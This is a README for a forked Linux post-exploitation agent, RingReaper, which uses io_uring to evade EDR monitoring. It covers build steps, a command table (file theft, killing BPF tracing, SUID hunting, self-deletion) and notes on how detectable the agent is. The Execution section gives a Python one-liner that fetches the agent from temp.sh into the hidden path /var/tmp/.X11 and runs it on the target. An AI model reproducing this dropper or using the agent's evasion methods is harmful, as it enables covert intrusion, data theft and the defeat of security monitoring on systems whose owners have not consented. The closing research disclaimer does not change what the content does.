# Notes on this fork

**todo**

- make a small loader that will load the actual agent
- add a way to load and execute bof or elf in via the agent

**Docker instuctions**

Build the docker

```
docker build -t agent-build .
```

this will install all the relevent code and build liburing for musl

start the docker, map a local dir where you can transfer the agent and server.py

```
docker run --rm -v ./local:/local -it agent-build
```

RingReaper is in /agent/RingReaper so cd there, edit agent.c for your IP + PORT and make. Then, copy agent and server.py to /local and you'll have a copy of both on your machine

**prereqs for compiling this version of RingReaper**

since I moved the compilation to musl-gcc to have a completely fully static bin to get file perms, you need to compile liburing with musl

```
git clone https://github.com/axboe/liburing.git
cd liburing

CC=musl-gcc \
CFLAGS="\
-isystem /usr/include/x86_64-linux-musl \
-isystem /usr/lib/gcc/x86_64-linux-gnu/$(gcc -dumpversion)/include \
-idirafter /usr/include/x86_64-linux-gnu \
-idirafter /usr/include \
" \
./configure --prefix=/opt/liburing-musl

CC=musl-gcc \
CFLAGS="\
-isystem /usr/include/x86_64-linux-musl \
-isystem /usr/lib/gcc/x86_64-linux-gnu/$(gcc -dumpversion)/include \
-idirafter /usr/include/x86_64-linux-gnu \
-idirafter /usr/include \
" \
make

sudo make install
```

you should be good to go to compile the agent cleanly after that

**Notes on what's working in testing**

| OS       | cmd_ls with user, group and perms                            | io_uring              |
|---------------|----------------------------------------------------------|----------------------|
| debian 13         | 	✔️                           | 	✔️        |
| ubuntu 26.04         | 	✔️             | 	✔️        |
| fedora 44         | 	✔️             | 	✔️        |
| CentOS 10         | 	✔️             | 	❌        |
| Oracle Linux 10         | 	✔️             | 	✔️        |

out of the box, CentOS has io_uring disabled. Once enabled, it is confirmed that the cmd_ls works fine. Compiling staticly with musl-gcc also fixed the issue of cmd_ls and perms with Oracle Linux 10 and probably all other linux where this would have failed

**add perms and users to cmd_ls**

while this makes it easier, this not only might be noisy but it also makes it so that you can't truely compile this static anymore. Moving to musl-gcc requires a compile of the liburing lib specifically for musl so I'll look into that later. Note that the printing of perms + user + group failed on Oracle Linux with a segfault so I'll either debug it or make a cmd_perms to fetch specific file permissions

**add cmd_ls**

this uses opendir + readdir so this will not be super stealthy. Will be fine for stuff like elastic and wazuh but not for more involved EDR. In order to fix the terminal output, this creates an artificial lag in the command output processing for all other commands as the server.py has to wait for an end of output tag. I'll try to fix it or simply revert and remove all the terminal code as it is very noisy (i.e. even auditd picks it up)

**hopefully fixed**

rewrote parts of the agent.c and server.py to properly process terminal output

**credits**

this is a fork of the original code from https://github.com/MatheuZSecurity/RingReaper

it incoporates the cmd_terminal addition from https://github.com/iurjscsi1101500/RingReaper/ but fixes the output of the terminal commands to be inline and insync with the command. 

**Disclaimer**

The fix for the cmd_terminal was AI assisted

# RingReaper

**RingReaper** is a simple post-exploitation agent for Linux designed for those who need to operate stealthily, minimizing the chances of being detected by EDR solutions. The idea behind this project was to leverage **io_uring**, the new asynchronous I/O interface in the Linux kernel, specifically to avoid traditional system calls that most EDRs tend to monitor or even hook.

In practice, RingReaper replaces calls such as `read`, `write`, `recv`, `send`, `connect`, among others, with asynchronous I/O operations (`io_uring_prep_*`), reducing exposure to hooks and event tracing typically collected in a standardized way by security products.

> **NOTE:** Some functions within RingReaper still rely on traditional calls, such as directory reading (`opendir`, `readdir`) or symbolic link resolution (`readlink`), because io_uring **does not yet fully support** these types of operations natively. Even so, during my tests, these calls did not trigger alerts on the tested EDRs, precisely because they fall outside the monitored network I/O paths.

In summary, RingReaper was built to **avoid traditional calls as much as possible**, and even in cases where it had to use them, it demonstrated excellent evasion capabilities, with no alerts or detections from common security agents.

See the full and detailed article at:

https://matheuzsecurity.github.io/hacking/evading-linux-edrs-with-io-uring/

Author: https://www.linkedin.com/in/mathsalves/

Rootkit Researchers

- https://discord.gg/66N5ZQppU7

## Command Reference

| Command       | Description                                              | Backend              |
|---------------|----------------------------------------------------------|----------------------|
| `get`         | Look files from the target                           | 100% io_uring        |
| `put`         | Upload files (uses `recv` on the agent side)             | 100% io_uring        |
| `killbpf`     | Disable tracing, remove `/sys/fs/bpf` files and kill processes using `bpf-map` | traditional calls + io_uring |
| `users`       | List logged-in users by reading `utmp`                   | 100% io_uring        |
| `ss` / `netstat` | List TCP connections from `/proc/net/tcp`            | 100% io_uring        |
| `privesc`     | Search for SUID binaries using `statx`                   | 100% io_uring        |
| `ps`          | List processes (uses `opendir`, `readdir`)               | traditional calls + io_uring   |
| `kick`        | Kill `pts` sessions (uses `opendir`, `readdir`, `kill`, `readlink`) | traditional calls + io_uring |
| `me`          | Show PID/TTY (`getpid`, `ttyname`)                       | traditional calls + io_uring   |
| `selfdestruct`| Delete the current binary (uses `readlink`)              | traditional calls + io_uring   |
| `terminal`| spawns a tty, very noisy              | traditional calls + io_uring   |
| `ls`| lists a directory (uses `opendir`,`readdir`)              | traditional calls + io_uring   |
| `exit`        | Terminate connection and exit                            | 100% io_uring        |
| `help`        | Display help                                             | 100% io_uring        |

In RingReaper, all data traffic, including control commands, uploads, and downloads, must pass through io_uring. This also ensures that the most sensitive operations remain off the radar of hooks and EDR monitoring based on traditional calls.

## About Evasion

RingReaper was designed from the ground up to bypass EDR monitoring. Many security solutions base their detection triggers on intercepting classic syscalls (`read`, `recv`, `send`, `connect`) at the kernel level. Since `io_uring` is relatively new and less integrated into the telemetry pipeline of these products, it often goes unnoticed by most agents, allowing for C2 sessions and data exfiltration without triggering alerts.

Even functions that still rely on older syscalls (such as directory reading) remained discreet enough not to raise alarms.

## Requirements

- Linux kernel 5.1 or higher  
- `liburing` library  
- A compatible C compiler (tested with GCC)  

## Env

Tested **ONLY** on the following kernel versions below;

- 6.8.0-60-generic
- 6.12.25-amd64

## Compilation

```
sudo apt install liburing-dev -y
gcc agent.c -o agent -luring -O2 -s -static
```

## Execution

In testing, I noticed that EDR detected the compilation of `agent.c` by monitoring GCC usage in real time (it's better not to use wget/curl). To bypass this, I compiled the agent statically on my machine, sent the finished binary via `temp.sh` and used Python on the target to download and execute it. This technique worked without warning.

Server (Attack box) : 

- `curl -F "file=@agent" https://temp.sh/upload`
- `python3 server.py --ip IP --port 443` 

Agent (Target machine) :

- `python3 -c "import urllib.request,os,subprocess; u=urllib.request.Request('http://temp.sh/xxxx/stealth_agent',method='POST'); d='/var/tmp/.X11'; open(d,'wb').write(urllib.request.urlopen(u).read()); os.chmod(d,0o755); subprocess.Popen([d]);"`

## Upgrades

**Version 2.0**:
* Support for multiple threaded connections.
* Command history (using the "up" and "down" keys).
* "Clear" command to avoid cluttering the screen.

## Contribution

Feel free to make pull requests and contribute to the project.
Any errors with RingReaper, please create an issue and report it to us.

## Disclaimer

This code was developed solely for educational purposes, research, and controlled demonstrations of evasion techniques. Any use outside authorized environments, or for malicious purposes, is strictly prohibited and entirely the responsibility of the user. Unauthorized or illegal use may violate local, national, or international laws.
